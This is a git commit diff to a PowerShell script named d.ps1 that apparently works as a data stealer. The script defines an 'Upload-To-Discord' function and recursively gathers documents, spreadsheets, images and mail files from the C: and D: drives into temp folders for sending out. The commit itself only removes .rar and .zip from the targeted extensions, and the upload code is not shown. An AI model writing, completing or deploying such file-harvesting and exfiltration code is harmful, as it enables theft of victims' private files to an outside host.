b1f7a6f41ec4967ae0ff77895167b9f63c8eca29
Jenova774 <jenova774@outlook.com>
2024-12-16 18:48:23 +0800

    Update d.ps1

--- d.ps1
+++ d.ps1
@@ -16,10 +16,10 @@ function Upload-To-Discord($file) {
 }
 
 #Get all files from user's home directory
-$files = Get-ChildItem -Path C:\, D:\ -Recurse | Where-Object {$.Extension -in ".doc", ".docx", ".ppt", "pptx", ".csv", ".pdf", ".txt", ".xls", ".xlsx", ".jpeg", ".jpg", ".png", ".msg", ".rar", ".zip"}
+$files = Get-ChildItem -Path C:\, D:\ -Recurse | Where-Object {$.Extension -in ".doc", ".docx", ".ppt", "pptx", ".csv", ".pdf", ".txt", ".xls", ".xlsx", ".jpeg", ".jpg", ".png", ".msg"}
 
 #Create folders for each file type
-$fileTypes = @(".doc", ".docx", ".ppt", "pptx", ".csv", ".pdf", ".txt", ".xls", ".xlsx", ".jpeg", ".jpg", ".png", ".msg", ".rar", ".zip")
+$fileTypes = @(".doc", ".docx", ".ppt", "pptx", ".csv", ".pdf", ".txt", ".xls", ".xlsx", ".jpeg", ".jpg", ".png", ".msg")
 foreach ($fileType in $fileTypes) {
     $folderPath = "C:\temp\files$fileType"
     if (!(Test-Path $folderPath)) {
